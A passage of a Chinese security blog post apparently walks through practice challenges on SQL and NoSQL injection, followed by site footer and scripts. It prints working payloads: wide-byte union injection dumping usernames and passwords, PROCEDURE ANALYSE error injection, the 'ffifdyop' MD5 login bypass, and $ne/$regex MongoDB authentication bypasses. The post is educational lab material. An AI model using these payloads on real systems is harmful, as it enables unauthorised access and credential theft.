+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,(select group_concat(column_name) from</span></span><br><span class="line"><span class="string">information_schema.columns where table_name=0x73746f726d67726f75705f6d656d626572),4,</span></span><br><span class="line"><span class="string">(select group_concat(column_name) from information_schema.columns where </span></span><br><span class="line"><span class="string">table_name=0x6e6f74696365) --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/e6dfe25f54c542e5a846e0e32d7eb0fe.png" alt="在这里插入图片描述"><br>此时想到我们登录需要的是name和password，因此我们查询这两个字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,(select group_concat(column_name) from</span></span><br><span class="line"><span class="string"> information_schema.columns where table_name=0x73746f726d67726f75705f6d656d626572),4,</span></span><br><span class="line"><span class="string"> (select group_concat(name,0x7e,password,0x7e,status) from </span></span><br><span class="line"><span class="string"> mozhe_discuz_stormgroup.stormgroup_member)--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/bf58a76e25cd4837b555fef23f127039.png" alt="在这里插入图片描述"><br>得到uesrname是mozhe，此时用password对后面状态为1的进行md5解密<br><img src="https://img-blog.csdnimg.cn/3d2cc47099f3497e8e0df9f3849fe7c0.png" alt="在这里插入图片描述"><br>得到密码，进行登录<br><img src="https://img-blog.csdnimg.cn/06a29bab43c44871902077a864dad95b.png" alt="在这里插入图片描述"><br>获取到了key，解题完成</p>
+<h2><span id="limit注入">limit注入</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="operator">/</span><span class="operator">/</span>分页查询</span><br><span class="line">  $<span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user limit ($page<span class="number">-1</span>)<span class="operator">*</span>$limit,$limit;</span><br><span class="line">返回逻辑 </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>TODO:很安全，不需要过滤</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>拿到数据库名字就算你赢</span><br></pre></td></tr></table></figure>
+<p>构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>limit<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/9ea5b590215a4524afdb53e7f2528ed9.png" alt="在这里插入图片描述"></p>
+<h2><span id="md5注入">md5注入</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username <span class="operator">=</span> $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password <span class="operator">=</span> md5($_POST[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>本关username声明必须为admin才能得到flag，再观察password，被md5函数包裹了<br>我们构造payload如下即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin </span><br><span class="line">password: ffifdyop</span><br></pre></td></tr></table></figure>
+
+<p>那此时语句就相当于是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(*) from ctfshow_user where username = &#x27;admin&#x27; and password= &#x27;&#x27;or &#x27;6+其他字符&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/ed3daedc5d54416183e9cd20311658ea.png" alt="在这里插入图片描述"></p>
+<h2><span id="nosql注入">nosql注入</span></h2><h3><span id="0x01">0X01</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="operator">/</span><span class="operator">/</span>无</span><br><span class="line">  $<span class="keyword">user</span> <span class="operator">=</span> $memcache<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">get</span>($id);</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span>无过滤</span><br></pre></td></tr></table></figure>
+<p><code>memcache</code>是返回数组的，此时按理说传<code>?id=flag</code>就可以，不过报错了，学习其他师傅的wp后说后端进行了intval检测,这个函数吧，他是检测数字的，本地测试如下<br><img src="https://img-blog.csdnimg.cn/922d8e99e71d4a97bcb9b1a6fcdc8699.png" alt="在这里插入图片描述"><br>因此我们需要构造一个数组形式，也就是<code>?id[]=flag</code>，当然二维数组的名字可以随便写，<code>?id[12345]=flag</code>也行，因为最终传入的数据是flag</p>
+<h3><span id="0x02">0X02</span></h3><p><img src="https://img-blog.csdnimg.cn/83116aad07694e2eb61e29a28bd2403c.png" alt="在这里插入图片描述"><br>观察语句并分析代码，发现传入的是变量data，而data中的数据是username和password，因此我们想实现成功获取flag，可以利用永真式，构造payload如下(ne是非的意思，具体见上方)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>此时执行的实际语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;$ne&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;$ne&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3><span id="0x03">0X03</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">sql</span>语句</span><br><span class="line">  $query <span class="operator">=</span> <span class="keyword">new</span> MongoDB\Driver\Query($data);</span><br><span class="line">  $<span class="keyword">cursor</span> <span class="operator">=</span> $manager<span class="operator">-</span><span class="operator">&gt;</span>executeQuery(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, $query)<span class="operator">-</span><span class="operator">&gt;</span>toArray();</span><br><span class="line"> <span class="operator">/</span><span class="operator">/</span>返回逻辑，无过滤</span><br><span class="line">  if(<span class="built_in">count</span>($<span class="keyword">cursor</span>)<span class="operator">&gt;</span><span class="number">0</span>)&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    array_push($ret[<span class="string">&#x27;data&#x27;</span>], $flag);</span><br><span class="line">  &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>这关你利用和上关同样的姿态，会发现有admin和admin1两个用户名<br><img src="https://img-blog.csdnimg.cn/aa22caac7c784336806a36607d36d1a8.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/8ee0996ecf7d44e9a1f6ffc51901ba9d.png" alt="在这里插入图片描述"><br> 方法一<br>此时看似无法使用永真式注入了，但是其实你仔细观察后会发现password一致，因此我们可以更改password对应的内容，构造payload如下即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$ne]<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span>ctfshow666nnneeaaabbbcc</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/4cdc3c616a3c49e1bdf29c8320555a76.png" alt="在这里插入图片描述"><br>方法二<br>正常这关的话利用的是正则匹配,因为flag的用户名可能是f开头，所以构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span>f.<span class="operator">*</span><span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>也可以让它匹配非a开头的，构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[$regex]<span class="operator">=</span><span class="operator">^</span>[<span class="operator">^</span>admin].<span class="operator">*</span>$<span class="operator">&amp;</span>password[$ne]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[^admin].<span class="strong">*$的话这个就随便作为字符，因为*</span>是全部</span><br></pre></td></tr></table></figure>
+
+<p>这个payload需要熟悉一下正则表达式的部分知识</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">^</span>的作用</span><br><span class="line"><span class="number">1</span>、限定开头</span><br><span class="line"><span class="operator">^</span>匹配后面紧跟的字符为开头的字符（[ ]之外或数字、元字符之前），如<span class="operator">^</span>[<span class="number">0</span><span class="number">-9</span>]，含义为以<span class="number">0</span><span class="number">-9</span>中的数字为第一个数字开头。</span><br><span class="line"><span class="number">2</span>、取反:</span><br><span class="line">当这个字符出现在一个字符集合模式（[ ]之内）的第一个字符时，表示为取反。如[<span class="operator">^</span><span class="number">0</span><span class="number">-9</span>]，表示为匹配除了数字以外的字符。</span><br><span class="line">$的作用</span><br><span class="line">表示从字符串末尾进行匹配。</span><br><span class="line">如<span class="operator">/</span><span class="operator">^</span>[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">8</span>&#125;$<span class="operator">/</span>，表示为字符串以数字为结尾字符。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+     
+   <div>
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+   </div>
+ 
+
+<div>
+      
+        
+      
+</div>
+
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt=" 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt=" 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+      
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    quan9i
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://quan9i.top/sqlzhuru/" title="浅析sql注入">https://quan9i.top/sqlzhuru/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> sql注入</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/dingding/" rel="next" title="利用python脚本实现钉钉自动打卡">
+                <i class="fa fa-chevron-left"></i> 利用python脚本实现钉钉自动打卡
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/websecurity1/" rel="prev" title="web安全基础知识学习-part1">
+                web安全基础知识学习-part1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/2.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/%5Bobject%20Object%5D" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/Reme_mber" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-gg-circle"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://wpa.qq.com/msgrd?v=3&uin=1537969147&site=qq&menu=yes" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/quan9i" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:shijishangjieke@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=7220329972&auto=0&height=430"></iframe>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">漏洞相关信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql注入常见类型（按照执行效果分类）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.1.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.2.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.3.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.4.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.5.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.6.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.7.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">相关知识介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.1.</span> <span class="nav-text">万能语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.2.</span> <span class="nav-text">md5特殊字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.3.</span> <span class="nav-text">nosql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.4.</span> <span class="nav-text">limit注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.5.</span> <span class="nav-text">可以相互替代的函数总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.1.</span> <span class="nav-text">时间盲注中的时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.2.</span> <span class="nav-text">布尔盲注中的正则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.3.</span> <span class="nav-text">联合查询中的where</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">注入实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.1.</span> <span class="nav-text">联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.1.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.1.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.1.3.</span> <span class="nav-text">0X03</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.2.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.2.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.2.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.2.3.</span> <span class="nav-text">0X03（布尔盲注正则版）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.3.1.</span> <span class="nav-text">0X01(时间盲注笛卡尔积版)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.3.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.3.3.</span> <span class="nav-text">0X03（二分法时间盲注）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.4.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.4.2.</span> <span class="nav-text">0X02</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.5.</span> <span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.5.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.5.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.5.3.</span> <span class="nav-text">0X03</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.6.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.7.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.7.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.7.2.</span> <span class="nav-text">0X02</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.8.</span> <span class="nav-text">limit注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.9.</span> <span class="nav-text">md5注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.10.</span> <span class="nav-text">nosql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.10.1.</span> <span class="nav-text">0X01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.10.2.</span> <span class="nav-text">0X02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">5.10.3.</span> <span class="nav-text">0X03</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <!-- modify icon to fire by szw -->
+      <i class="fa fa-history fa-" aria-hidden="true"></i>
+      近期文章
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+      
+        <li class="recent_posts_li">
+          <a href="/websecurity3/" title="web安全基础知识学习-part3" target="_blank">web安全基础知识学习-part3</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/fileinclude/" title="浅析文件包含" target="_blank">浅析文件包含</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/websecurity2/" title="web安全基础知识学习-part2" target="_blank">web安全基础知识学习-part2</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/websecurity1/" title="web安全基础知识学习-part1" target="_blank">web安全基础知识学习-part1</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sqlzhuru/" title="浅析sql注入" target="_blank">浅析sql注入</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+
+
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">&copy; 2021-11 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">quan9i</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">89.4k</span>
+  
+</div>
+
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("11/12/2021 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+
+
+
+
+
+
+
+
+
+
+        
+  
+-   <span class="site-uv" title="我的第 undefined 位朋友">
++   <span class="site-uv">
++     我的第 <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 位朋友
+-     <i class="fa fa-heart"></i>
+-     <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+-   <span class="site-pv" title="历经 undefined 次回眸才与你相遇">
++   <span class="site-pv">
++     历经 <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次回眸才与你相遇
+-     <i class="fa fa-heart"></i>
+-     <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
